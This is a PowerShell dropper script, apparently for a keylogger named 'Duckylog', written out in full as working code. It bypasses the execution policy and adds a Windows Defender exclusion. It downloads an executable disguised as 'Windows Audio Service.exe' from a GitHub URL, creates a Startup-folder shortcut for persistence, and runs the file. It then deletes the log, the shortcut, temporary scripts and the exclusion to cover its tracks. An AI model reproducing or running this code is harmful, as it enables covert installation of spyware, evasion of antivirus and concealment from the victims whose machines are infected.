# Set Execution Policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

# Define paths
$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, 'Windows Audio Services.lnk')
$exePath = "$env:TEMP\Windows Audio Service.exe"
$exeUrl = "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service.exe?raw=true"
$logFilePath = "$env:TEMP\log.txt"

# Functions
function Test-NetworkConnection {
    Test-Connection -ComputerName google.com -Count 1 -Quiet
}

function Remove-TempScripts {
    Get-ChildItem -Path ([System.IO.Path]::GetTempPath()) -Filter "*.ps1" -File | Remove-Item -Force
}

function Remove-Exclusion {
    try {
        Remove-MpPreference -ExclusionPath $exePath
    } catch {}
}

# Trap for cleanup
trap { 
    Remove-TempScripts
    Remove-Exclusion
    break 
}

# Ensure admin privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    exit
}

# Add exclusion
try {
    Add-MpPreference -ExclusionPath $exePath
} catch {}

# Wait for network connection
while (-Not (Test-NetworkConnection)) {
    Start-Sleep -Seconds 5
}

# Check if shortcut exists
if (-Not (Test-Path $shortcutPath)) {
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($exeUrl, $exePath)
    } catch {
        exit
    }

    $wshShell = New-Object -ComObject WScript.Shell
    $shortcut = $wshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $exePath
    $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($exePath)
    $shortcut.Save()
}

if (-Not (Test-Path $logFilePath)) { New-Item -Path $logFilePath -ItemType File }

try {
    $exeProcess = Start-Process -FilePath $exePath -NoNewWindow -PassThru
    $exeProcess.WaitForExit()
} catch {}

finally {
    if (Test-Path $logFilePath) { Remove-Item -Path $logFilePath }
    if (Test-Path $shortcutPath) { Remove-Item -Path $shortcutPath -Force }
    if (Test-Path $exePath) { Remove-Item -Path $exePath -Force }
    Remove-TempScripts
    Remove-Exclusion
}

Start-Sleep -Seconds 2
exit
